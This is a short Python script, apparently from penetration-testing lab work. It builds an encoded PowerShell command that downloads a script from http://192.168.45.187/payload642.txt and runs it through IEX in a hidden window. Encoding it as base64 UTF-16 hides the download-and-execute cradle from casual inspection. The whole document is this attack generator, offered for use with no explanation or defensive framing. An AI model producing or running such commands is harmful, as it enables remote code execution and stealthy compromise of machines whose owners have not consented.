import sys
import base64

payload = '(New-Object System.Net.WebClient).DownloadString("http://192.168.45.187/payload642.txt") | IEX'


cmd = "powershell -nop -w hidden -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()

print(cmd)
